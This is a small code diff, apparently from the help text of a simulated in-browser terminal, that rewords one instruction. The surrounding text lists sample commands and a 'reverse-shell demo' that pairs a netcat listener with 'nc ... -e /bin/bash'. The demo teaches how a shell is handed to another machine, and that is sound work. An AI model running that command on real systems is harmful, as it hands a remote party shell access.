@@ -41,7 +41,7 @@ Try:  ls -la      ·   cat readme.md      ·   grep -i error /var/log/syslog
       nmap 10.0.0.5      ·   ping -c 3 google.com      ·   sudo apt update
       chmod +x scripts/hello.sh && ./scripts/hello.sh
 
-Reverse-shell demo — open a second tab (the ⧉ button), then:
+Reverse-shell demo — open a second terminal (the two-panes button in the header), then:
       Tab A:  nc -lvnp 4444            Tab B:  nc <tabA-ip> 4444 -e /bin/bash
   * full-screen editors (nano/vi) show a redirection tip instead.
 `;
